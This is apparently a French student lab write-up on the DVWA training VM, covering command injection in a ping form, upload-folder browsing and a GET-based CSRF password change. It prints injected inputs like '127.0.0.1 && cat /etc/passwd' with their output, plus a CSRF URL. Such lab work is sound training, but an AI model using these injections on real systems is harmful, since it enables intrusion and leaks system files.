# RENDU TP1 - Romain DUPONT DE POOTER et Ugo VALLAT


## Command Execution

Dans cette partie, nous avons essayé les exécutions de commandes en passant par insérant une commande arbitraire. Dans l'environnement donné le système exécute la command 'ping X.X.X.X' avec une adresse IPv4 envoyé par l'utilisateur. 
Cependant aucune __input sanitanization__ n'est effectuée sur celle-ci, ainsi de simple connaissances en bash permettent de réaliser tout ce que l'on souhaite sur la machine. 
Il suffit d'ajouter '&&' à la fin de la commande pour ensuite permettre l'exécution d'une nouvelle commande de notre choix. Il n'y pas de contrôle effectué sur la sortie non plus, ainsi la sortie de la commande malveillante est affichée à l'écran avec le résultat du ping.

Par exemple,
- __'127.0.0.1 && id && uname -r && pwd'__ retourne : 
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.037 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.023/0.033/0.041/0.010 ms

uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
2.6.32-24-generic
/opt/lampp/htdocs/vulnerabilities/exec
```

- __'127.0.0.1 && cat /etc/passwd'__ affiche le contenu :
```
[...]
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```

Cela nous permet d'afficher des informations qui peuvent être sensibles, tel que :

- __'127.0.0.1 && ifconfig'__ nous retourne les information sur la configuration de l'interface réseau :
```
[...]
eth0      Link encap:Ethernet  HWaddr 08:00:27:dd:97:5b  
          inet addr:192.168.56.101  Bcast:192.168.56.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fedd:975b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:201 errors:0 dropped:0 overruns:0 frame:0
          TX packets:251 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:37598 (37.5 KB)  TX bytes:170271 (170.2 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:152 errors:0 dropped:0 overruns:0 frame:0
          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:12204 (12.2 KB)  TX bytes:12204 (12.2 KB
```

Une solution à ces injections de commandes serait de nettoyer les entrées de l'utilisateur et s'assurer qu'il n'y a pas de débordement possibles.

## Téléversement de fichiers

Lors de l'upload du fichier on peut de suite remarqué le message suivant : __"../../hackable/uploads/aye.jpg succesfully uploaded!"__.
Cela ressemble beaucoup à un chemin relatif...

Et effectivement, si l'on se rend à __"http://192.168.56.101/hackable/uploads/aye.jpg"__ on retrouve l'image téléversé précédemment.
Mais cela signifie que l'on peut aussi se balader dans l'arborescence en restant dans le dossier __"hackable/uploads/"__ et on découvre une nouvelle image qui n'est pas la notre ! Dans le cas de cette VM il s'agit de l'image représentant une adresse mail, qui est la suivante : dvwa@ethicalhack3r.co.uk.

Mais encore mieux, si on retourne plus bas dans l'arborescence on trouve un dossier __user__ dans le dossier __hackable__, celui-ci contient des images au nom des users suivant : {1337, admin, gordonb, pablo, smithy}. 

Une solution à cela serait de mettre en place des permissions sur l'accès des répertoires, et de ne pas laisser n'importe qui se balader n'importe où.


## Cross Site Request Forgery (CSRF)

Ici lors de l'envoie d'un formulaire on peut observer que les informations envoyées sont passées par GET. Celle-ci sont donc visibles et en clair dans l'URL : 
```
http://192.168.56.101/vulnerabilities/csrf/?password_new=TEST&password_conf=TEST&Change=Change#
```
Après vérification, le mot de passe a bien été changé. Cependant notre nouveau de passe est en clair dans la requête GET ! Celle-ci peut donc être facilement interceptée et ré-utilisée par un attaquant.

Pour se protéger de cela, une première solution serait de ne pas passer le mot de passe en clair dans la requête.
